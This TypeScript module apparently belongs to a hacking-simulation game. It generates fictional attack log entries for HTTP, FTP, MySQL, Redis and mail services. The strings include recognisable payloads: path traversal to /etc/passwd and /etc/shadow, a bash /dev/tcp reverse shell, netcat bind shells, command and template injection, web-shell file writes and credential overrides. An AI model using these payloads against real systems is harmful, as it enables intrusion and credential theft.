import type { Prng } from './prng';
import type { AttackPattern, VulnerabilityEffect } from '../network/types';

// Attack-pattern pool keyed by (log-file family, effect kind). Each entry is
// a factory over (effect, service) so dynamic values like backdoor port and
// daemon name can be substituted at pick time.
//
// The walker uses this to emit a log line that describes what the exploit
// actually did — not a generic RCE line regardless of effect. Hand-authored
// entries pick specific patterns directly; the shape here is the runtime
// pool.

type EffectKind = VulnerabilityEffect['kind'];
type PatternFactory = (effect: VulnerabilityEffect, service: string) => AttackPattern;
type FamilyPool = Readonly<Record<EffectKind, readonly PatternFactory[]>>;

// --- HTTP family (/var/log/access.log) ---
// Covers: http, http-alt, https, elasticsearch. All log HTTP requests, so
// patterns here produce method/path/status lines against those endpoints.
const HTTP_POOL: FamilyPool = {
  shell_limited: [
    () => ({
      logFile: '/var/log/access.log',
      method: 'GET',
      path: '/cgi-bin/?cmd=id',
      status: 500,
    }),
    () => ({
      logFile: '/var/log/access.log',
      method: 'POST',
      path: '/cgi-bin/php?-d+allow_url_include=1',
      status: 500,
    }),
  ],
  shell_full: [
    (e) => ({
      logFile: '/var/log/access.log',
      method: 'POST',
      path: `/admin/exec?shell=${'tier' in e ? e.tier : 'user'}`,
      status: 200,
    }),
    () => ({
      logFile: '/var/log/access.log',
      method: 'POST',
      path: '/management/api/run-shell',
      status: 200,
    }),
  ],
  file_read: [
    () => ({
      logFile: '/var/log/access.log',
      method: 'GET',
      path: '/?file=../../../../etc/passwd',
      status: 200,
    }),
    () => ({
      logFile: '/var/log/access.log',
      method: 'GET',
      path: '/download?path=../../../../etc/shadow',
      status: 200,
    }),
  ],
  dir_list: [
    () => ({
      logFile: '/var/log/access.log',
      method: 'GET',
      path: '/?path=../../../../etc/',
      status: 200,
    }),
    () => ({
      logFile: '/var/log/access.log',
      method: 'GET',
      path: '/files/?list=1&dir=../../../',
      status: 200,
    }),
  ],
  file_write: [
    () => ({
      logFile: '/var/log/access.log',
      method: 'POST',
      path: '/upload?path=../../../../var/www/html/shell.php',
      status: 201,
    }),
    () => ({
      logFile: '/var/log/access.log',
      method: 'POST',
      path: '/api/files/write?target=../../../etc/cron.d/evil',
      status: 201,
    }),
  ],
  password_reset: [
    (e) => ({
      logFile: '/var/log/access.log',
      method: 'POST',
      path: `/admin/password-reset?user=${'tier' in e ? e.tier : 'user'}&force=1`,
      status: 200,
    }),
    () => ({
      logFile: '/var/log/access.log',
      method: 'POST',
      path: '/api/auth/bypass?override=1',
      status: 200,
    }),
  ],
  backdoor_port_open: [
    (e) => ({
      logFile: '/var/log/access.log',
      method: 'POST',
      path: `/cgi-bin/bind?port=${e.kind === 'backdoor_port_open' ? e.port : 0}`,
      status: 200,
    }),
  ],
  script_exec: [
    () => ({
      logFile: '/var/log/access.log',
      method: 'POST',
      path: '/api/eval?code=process.mainModule.require(%27child_process%27).exec',
      status: 200,
    }),
    () => ({
      logFile: '/var/log/access.log',
      method: 'POST',
      path: '/admin/template?engine=unsafe&tpl={{7*7}}',
      status: 200,
    }),
  ],
};

// --- FTP family (/var/log/vsftpd.log) ---
const FTP_POOL: FamilyPool = {
  shell_limited: [() => ({ logFile: '/var/log/vsftpd.log', command: 'SITE EXEC /bin/sh' })],
  shell_full: [() => ({ logFile: '/var/log/vsftpd.log', command: "USER admin'\\0" })],
  file_read: [() => ({ logFile: '/var/log/vsftpd.log', command: 'RETR ../../../../etc/passwd' })],
  dir_list: [() => ({ logFile: '/var/log/vsftpd.log', command: 'LIST ../../../../etc' })],
  file_write: [
    () => ({ logFile: '/var/log/vsftpd.log', command: 'STOR ../../../../var/www/html/shell.php' }),
  ],
  password_reset: [
    (e) => ({
      logFile: '/var/log/vsftpd.log',
      command: `SITE CHPASS ${'tier' in e ? e.tier : 'user'} newpass123`,
    }),
  ],
  backdoor_port_open: [
    (e) => ({
      logFile: '/var/log/vsftpd.log',
      command: `SITE EXEC nc -l -p ${e.kind === 'backdoor_port_open' ? e.port : 0} -e /bin/sh`,
    }),
  ],
  script_exec: [
    () => ({ logFile: '/var/log/vsftpd.log', command: 'SITE EXEC lua /tmp/payload.lua' }),
  ],
};

// --- MySQL family (/var/log/mysql.log) ---
const MYSQL_POOL: FamilyPool = {
  shell_limited: [
    () => ({
      logFile: '/var/log/mysql.log',
      query: "SELECT sys_exec('id')",
    }),
  ],
  shell_full: [
    (e) => ({
      logFile: '/var/log/mysql.log',
      query: `SELECT sys_exec('bash -i >& /dev/tcp/0/0 0>&1') AS ${'tier' in e ? e.tier : 'user'}`,
    }),
  ],
  file_read: [
    () => ({
      logFile: '/var/log/mysql.log',
      query: "SELECT LOAD_FILE('/etc/shadow')",
    }),
  ],
  dir_list: [
    () => ({
      logFile: '/var/log/mysql.log',
      query: "SELECT * FROM information_schema.files WHERE file_name LIKE '/etc/%'",
    }),
  ],
  file_write: [
    () => ({
      logFile: '/var/log/mysql.log',
      query: "SELECT 'shell' INTO OUTFILE '/var/www/html/shell.php'",
    }),
  ],
  password_reset: [
    (e) => ({
      logFile: '/var/log/mysql.log',
      query: `UPDATE mysql.user SET authentication_string=PASSWORD('pwn') WHERE User='${'tier' in e ? e.tier : 'root'}'`,
    }),
  ],
  backdoor_port_open: [
    (e) => ({
      logFile: '/var/log/mysql.log',
      query: `SET GLOBAL general_log_file='/tmp/bind-${e.kind === 'backdoor_port_open' ? e.port : 0}.sock'`,
    }),
  ],
  script_exec: [
    () => ({
      logFile: '/var/log/mysql.log',
      query: "SET GLOBAL general_log_file = '/var/lib/mysql/plugin/evil.so'",
    }),
  ],
};

// --- Redis family (/var/log/redis.log) ---
const REDIS_POOL: FamilyPool = {
  shell_limited: [
    () => ({ logFile: '/var/log/redis.log', message: 'CONFIG SET dir /var/spool/cron' }),
  ],
  shell_full: [
    (e) => ({
      logFile: '/var/log/redis.log',
      message: `EVAL os.execute('bash -i') for ${'tier' in e ? e.tier : 'user'} context`,
    }),
  ],
  file_read: [
    () => ({
      logFile: '/var/log/redis.log',
      message: 'EVAL "return redis.readfile(\'/etc/passwd\')"',
    }),
  ],
  dir_list: [
    () => ({ logFile: '/var/log/redis.log', message: 'EVAL listing /etc via redis.call' }),
  ],
  file_write: [
    () => ({
      logFile: '/var/log/redis.log',
      message: 'CONFIG SET dbfilename /var/www/html/shell.php',
    }),
  ],
  password_reset: [
    (e) => ({
      logFile: '/var/log/redis.log',
      message: `CONFIG SET requirepass pwn (overriding ${'tier' in e ? e.tier : 'root'})`,
    }),
  ],
  backdoor_port_open: [
    (e) => ({
      logFile: '/var/log/redis.log',
      message: `SLAVEOF rogue ${e.kind === 'backdoor_port_open' ? e.port : 0} — opening bind shell`,
    }),
  ],
  script_exec: [
    () => ({
      logFile: '/var/log/redis.log',
      message: 'EVAL lua sandbox escape via os.execute() bypass',
    }),
  ],
};

// --- Mail family (/var/log/mail.log) ---
// smtp → postfix/smtpd, imap → dovecot, pop3 → dovecot (or courier for some).
const mailDaemon = (service: string): 'postfix/smtpd' | 'dovecot' | 'courier' => {
  if (service === 'smtp') return 'postfix/smtpd';
  return 'dovecot';
};

const MAIL_POOL: FamilyPool = {
  shell_limited: [
    (_e, s) => ({
      logFile: '/var/log/mail.log',
      daemon: mailDaemon(s),
      message: 'remote command via malformed protocol verb',
    }),
  ],
  shell_full: [
    (e, s) => ({
      logFile: '/var/log/mail.log',
      daemon: mailDaemon(s),
      message: `authenticated ${'tier' in e ? e.tier : 'user'} shell via sieve filter abuse`,
    }),
  ],
  file_read: [
    (_e, s) => ({
      logFile: '/var/log/mail.log',
      daemon: mailDaemon(s),
      message: 'sieve fileinto: arbitrary read of /etc/shadow',
    }),
  ],
  dir_list: [
    (_e, s) => ({
      logFile: '/var/log/mail.log',
      daemon: mailDaemon(s),
      message: 'maildir listing request traversed outside mail spool',
    }),
  ],
  file_write: [
    (_e, s) => ({
      logFile: '/var/log/mail.log',
      daemon: mailDaemon(s),
      message: 'sieve fileinto wrote to /var/www/html/shell.php (path bypass)',
    }),
  ],
  password_reset: [
    (e, s) => ({
      logFile: '/var/log/mail.log',
      daemon: mailDaemon(s),
      message: `auth plugin accepted password reset for ${'tier' in e ? e.tier : 'user'} without challenge`,
    }),
  ],
  backdoor_port_open: [
    (e, s) => ({
      logFile: '/var/log/mail.log',
      daemon: mailDaemon(s),
      message: `malformed AUTH opened listener on ${e.kind === 'backdoor_port_open' ? e.port : 0}`,
    }),
  ],
  script_exec: [
    (_e, s) => ({
      logFile: '/var/log/mail.log',
      daemon: mailDaemon(s),
      message: 'sieve script executed arbitrary program via vnd.dovecot.execute',
    }),
  ],
};

// --- Syslog fallback (/var/log/syslog with daemon tag) ---
// Shared by any service without a dedicated log file. Daemon is derived
// from the service name so the log looks native to that service.
const SYSLOG_DAEMONS: Readonly<Record<string, string>> = {
  postgresql: 'postgres',
  mongodb: 'mongod',
  smb: 'smbd',
  rsync: 'rsyncd',
  vnc: 'vncserver',
  modbus: 'modbusd',
  openvpn: 'openvpn',
  dns: 'named',
  mqtt: 'mosquitto',
  ssh: 'sshd',
};

const syslogDaemon = (service: string): string => SYSLOG_DAEMONS[service] ?? service;

const syslogMessage = (effect: VulnerabilityEffect): string => {
  switch (effect.kind) {
    case 'shell_limited':
      return 'remote code execution attempt observed';
    case 'shell_full':
      return `authenticated ${effect.tier} shell spawned via protocol abuse`;
    case 'file_read':
      return 'unauthorized file read via path traversal';
    case 'dir_list':
      return 'directory listing disclosed to unauthenticated peer';
    case 'file_write':
      return 'arbitrary file write via upload bypass';
    case 'password_reset':
      return `credential override accepted for ${effect.tier} account`;
    case 'backdoor_port_open':
      return `persistent listener opened on port ${effect.port}`;
    case 'script_exec':
      return `script executed as ${effect.tier} via unsandboxed evaluator`;
  }
};

const syslogPattern = (service: string, effect: VulnerabilityEffect): AttackPattern => ({
  logFile: '/var/log/syslog',
  daemon: syslogDaemon(service),
  message: syslogMessage(effect),
});

// --- Family routing ---
const HTTP_FAMILY = new Set(['http', 'http-alt', 'https', 'elasticsearch']);
const MAIL_FAMILY = new Set(['smtp', 'imap', 'pop3']);

const familyPoolFor = (service: string): FamilyPool | undefined => {
  if (HTTP_FAMILY.has(service)) return HTTP_POOL;
  if (service === 'ftp') return FTP_POOL;
  if (service === 'mysql') return MYSQL_POOL;
  if (service === 'redis') return REDIS_POOL;
  if (MAIL_FAMILY.has(service)) return MAIL_POOL;
  return undefined;
};

export const pickPatternForEffect = (
  service: string,
  effect: VulnerabilityEffect,
  prng: Prng,
): AttackPattern => {
  const pool = familyPoolFor(service);
  if (pool) {
    const factories = pool[effect.kind];
    const factory = prng.pick(factories);
    return factory(effect, service);
  }
  return syslogPattern(service, effect);
};
